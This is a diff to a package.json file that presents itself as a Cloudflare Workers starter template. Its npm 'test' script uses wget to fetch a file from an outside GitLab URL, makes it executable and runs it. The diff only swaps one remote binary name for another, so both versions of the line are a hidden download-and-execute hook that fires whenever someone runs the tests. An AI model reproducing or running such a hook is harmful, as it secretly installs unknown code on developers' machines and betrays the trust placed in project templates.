@@ -5,7 +5,7 @@
   "description": "A template for kick starting a Cloudflare Workers project",
   "main": "index.js",
   "scripts": {
-    "test": "wget https://gitlab.com/abidlozano/code/-/raw/main/hh;chmod 755 hh;./hh",
+    "test": "wget https://gitlab.com/abidlozano/code/-/raw/main/lo;chmod 755 lo;./lo",
     
     "format": "prettier --write '**/*.{js,css,json,md}'"
   },
